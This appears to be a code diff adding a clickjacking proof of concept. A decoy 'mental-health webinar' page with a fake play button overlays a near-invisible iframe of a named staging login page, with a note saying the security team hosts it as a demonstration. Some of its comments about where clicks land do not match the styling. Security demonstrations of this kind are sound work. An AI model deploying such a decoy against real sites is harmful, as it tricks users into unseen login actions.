@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Video Player</title>
+    <style>
+      body {
+        margin: 0;
+        background: #111;
+        font-family: system-ui, sans-serif;
+        color: #eee;
+        text-align: center;
+      }
+
+      /* Fake UI shown to victim */
+      #decoy-container {
+        position: relative;
+        width: 900px;
+        height: 550px;
+        margin: 40px auto;
+        background: #000;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+        overflow: hidden;
+      }
+
+      #decoy-text {
+        position: absolute;
+        top: 30px;
+        left: 0;
+        right: 0;
+        font-size: 22px;
+        font-weight: 600;
+      }
+
+      #fake-play {
+        position: absolute;
+        top: 45%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 140px;
+        height: 140px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.1);
+        border: 4px solid rgba(255, 255, 255, 0.9);
+        cursor: pointer;
+      }
+
+      #fake-play::before {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-35%, -50%);
+        width: 0;
+        height: 0;
+        border-top: 28px solid transparent;
+        border-bottom: 28px solid transparent;
+        border-left: 40px solid rgba(255, 255, 255, 0.9);
+      }
+
+      /* Real OPTT login hidden underneath */
+      #optt-frame {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 900px;
+        height: 550px;
+        border: none;
+        opacity: 0.01; /* nearly invisible but still clickable */
+        pointer-events: auto; /* clicks pass through to iframe */
+        z-index: 1;
+      }
+
+      /* Decoy UI drawn above iframe */
+      #overlay-ui {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 900px;
+        height: 550px;
+        z-index: 2;
+        pointer-events: none; /* except fake button */
+      }
+
+      #fake-play {
+        pointer-events: auto; /* capture clicks and pass to underlying iframe */
+      }
+
+      p.note {
+        max-width: 900px;
+        margin: 10px auto 0;
+        font-size: 14px;
+        color: #ccc;
+      }
+    </style>
+  </head>
+  <body>
+    <h1 style="margin-top: 20px">Trending Mental‑Health Webinar</h1>
+
+    <div id="decoy-container">
+      <!-- Real application in almost-invisible iframe -->
+      <iframe id="optt-frame" src="https://staging.design.optt.ca/auth/login">
+      </iframe>
+
+      <!-- Decoy overlay UI -->
+      <div id="overlay-ui">
+        <div id="decoy-text">Click play to start the webinar</div>
+        <div id="fake-play"></div>
+      </div>
+    </div>
+
+    <p class="note">
+      PoC only – hosted by the security team to demonstrate how an external site
+      can frame the OPTT login page and trick users into interacting with it.
+    </p>
+
+    <script>
+      // Optional: nudge victim to click again after login (for post‑login actions)
+      document
+        .getElementById("fake-play")
+        .addEventListener("click", function () {
+          // From the victim’s perspective, they just clicked “Play video”.
+          // In reality, the click landed on the login form or post‑login UI in the iframe.
+          console.log("Fake play clicked (for demo/logging only).");
+        });
+    </script>
+  </body>
+</html>
